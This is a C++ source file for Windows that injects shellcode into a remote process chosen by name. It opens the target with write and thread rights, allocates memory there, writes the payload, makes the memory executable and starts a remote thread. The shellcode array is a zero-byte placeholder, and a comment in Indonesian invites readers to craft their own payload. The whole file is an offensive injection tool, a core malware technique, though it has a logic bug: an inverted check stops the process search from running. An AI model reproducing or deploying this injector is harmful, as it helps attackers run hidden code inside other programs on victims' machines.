#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <tchar.h>

BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
	if (!szProcessName || !dwProcessId || !hProcess) {
		std::wcerr << L"[!] Invalid parameter passed to GetRemoteProcessHandle" << std::endl;
		return FALSE;
	}
	PROCESSENTRY32 procEntry = { 0 };
	procEntry.dwSize = sizeof(PROCESSENTRY32);

	//takes s snapshot of the currently running processes
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		std::wcerr << L"[!] CreateToolhelp32Snapshot Failed with error : " << GetLastError() << std::endl;
		return FALSE;
	}
	BOOL found = FALSE;

	//retrieves information about the first process encountered in the snapshot
	if (!Process32First(hSnapshot, &procEntry)) {
		do {
			//use the dot operator to extract the process name from the populated struct
			//if the process name matches the process were looking for
			if (_wcsicmp(procEntry.szExeFile, szProcessName) == 0) {
				//use the dot operator to extract the process ID from the populated struct
				//save the PID
				*dwProcessId = procEntry.th32ProcessID;

				//open handler to the process
				*hProcess = OpenProcess(
					PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
					FALSE,
					procEntry.th32ProcessID
				);
				if (!*hProcess) {
					std::wcerr << L"[!] Openprocess failed with error : " << GetLastError() << std::endl;
					CloseHandle(hSnapshot);
					return FALSE;
				}
				found = TRUE;
				break;
			}
		} while (Process32Next(hSnapshot, &procEntry));
	}
	else {
		std::wcerr << L"[!] Process32First failed with error : " << GetLastError() << std::endl;
	}
	CloseHandle(hSnapshot);
	return found;
}

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {
	if (!hProcess || !pShellcode || !sSizeOfShellcode) {
		std::wcerr << L"[!] Invalid Parameter to InjectShellcodeToRemoteProcess" << std::endl;
	}

	//allocate memory in the remote process of size sSizeOfShellcode
	PVOID pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!pShellcodeAddress) {
		std::wcerr << L"[!] VirtualAllocEx Failed with process : " << GetLastError() << std::endl;
		return FALSE;
	}
	std::wcout << L"ALlocated Memory at : 0x" << pShellcodeAddress << std::endl;


	SIZE_T sBytesWritten = 0;
	//write the shellcode in the allocated memory
	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sBytesWritten) || sBytesWritten != sSizeOfShellcode) {
		std::wcerr << L"[!] WriteProcessMemory Failed with error : " << GetLastError() << std::endl;
		return FALSE;
	}
	std::wcout << L"[i] Successfully Written " << sBytesWritten << L" Bytes" << std::endl;

	memset(pShellcode, '\0', sSizeOfShellcode);

	DWORD dwOldProtection = 0;
	//make the memory region executable
	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) {
		std::wcerr << L"[!] VirtualProtectEx Failed with error : " << GetLastError() << std::endl;
		return FALSE;
	}

	HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, 0, NULL);
	if (!hRemoteThread) {
		std::wcerr << L"[!] CreateRemoteThread Failed with error : " << GetLastError() << std::endl;
	}
	std::wcout << L"[+] Shellcode thread successfully created" << std::endl;

	WaitForSingleObject(hRemoteThread, INFINITE);
	CloseHandle(hRemoteThread);
	return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {
	if (argc != 2) {
		std::wcerr << L"Usage : " << argv[0] << L"<target_process_name.exe>" << std::endl;
		return 1;
	}
	DWORD dwProcessId = 0;
	HANDLE hProcess = NULL;

	if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {
		std::wcerr << L"[!] Could not obtain handle to remote process" << std::endl;
		return 1;
	}

	std::wcout << L"[+] Got Handle to process ID : " << dwProcessId << std::endl;

	BYTE shellcode[]{
		0x00, 0x00, 0x00, 0x00 //CRAFTING AJA SENDIRI TERSERAH SI MAU PAKE APA
	};
	SIZE_T shellcodeSize = sizeof(shellcode);

	if (!InjectShellcodeToRemoteProcess(hProcess, shellcode, shellcodeSize)) {
		std::wcerr << L"[!] Shellcode injection Failed" << std::endl;
		CloseHandle(hProcess);
		return 1;
	}

	std::wcout << L"[+] Shellcode injection successfully" << std::endl;
	CloseHandle(hProcess);
	return 0;

}